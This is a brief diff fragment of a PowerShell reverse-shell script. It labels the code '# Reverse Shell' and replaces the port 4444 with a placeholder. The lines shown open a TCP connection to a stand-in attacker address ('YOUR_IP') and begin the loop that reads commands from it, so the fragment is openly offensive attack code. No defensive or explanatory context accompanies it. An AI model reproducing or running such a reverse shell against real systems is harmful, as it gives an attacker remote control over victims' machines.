@@ -1,4 +1,5 @@
-$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",4444);
+# Reverse Shell
+$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",L_PORT);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
